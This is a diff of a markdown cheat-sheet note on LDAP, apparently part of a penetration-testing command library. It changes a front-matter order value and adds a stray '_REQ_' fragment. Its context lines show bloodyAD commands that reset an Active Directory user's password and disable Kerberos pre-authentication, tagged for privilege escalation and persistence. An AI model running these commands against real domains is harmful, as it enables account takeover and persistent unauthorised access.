@@ -3,7 +3,7 @@ id: "uoac3mbtampsitwyj"
 title: "ldap"
 description: ""
 tags: []
-order: 9
+order: "9"
 createdAt: "2026-05-30T15:44:10.267Z"
 updatedAt: "2026-05-30T15:44:20.860Z"
 ---
@@ -434,6 +434,8 @@ bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' set password $USER 'NewP@ss12
 ```bash
 bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' add uac $USER DONT_REQ_PREAUTH
 ```
+
+_REQ_
 
 **Tags:** ldap, bloodyad, ad-abuse, privilege-escalation, persistence
 <!-- cmd: {"id":"yxhdlnnrxmpsiu541","language":"bash","sectionId":"k3xel642pmpsiu4w2","tags":["ldap","bloodyad","ad-abuse","privilege-escalation","persistence"]} -->
